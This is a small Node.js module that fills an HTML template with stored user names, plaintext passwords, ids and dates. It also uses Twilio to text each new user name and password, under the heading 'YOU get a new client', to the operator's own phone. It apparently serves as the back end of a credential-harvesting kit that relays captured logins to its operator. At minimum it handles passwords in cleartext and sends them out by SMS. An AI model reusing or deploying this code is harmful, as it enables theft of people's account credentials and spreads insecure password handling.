"use strict";

var twilio = require('twilio');

var dotenv = require('dotenv');

dotenv.config();

var htmlData = function htmlData(html, object) {
  return object.map(function (data) {
    var output = html.replace('{{%name%}}', data.user_name);
    output = output.replace('{{%password%}}', data.password);
    output = output.replace('{{%id%}}', data._id);
    output = output.replace('{{%date%}}', data.createAt);
    output = output.replace('{{%del%}}', data._id);
    return output;
  });
};

var sendSMS = function sendSMS(data) {
  var client = new twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH);
  return client.messages.create({
    body: "\n YOU get a new client : ".concat(data.user_name, ", \n            ").concat(data.password),
    from: process.env.TWILIO_PHONE,
    to: process.env.MY_PHONE
  })["catch"](function (err) {
    console.log(err.message);
  });
};

module.exports = {
  htmlData: htmlData,
  sendSMS: sendSMS
};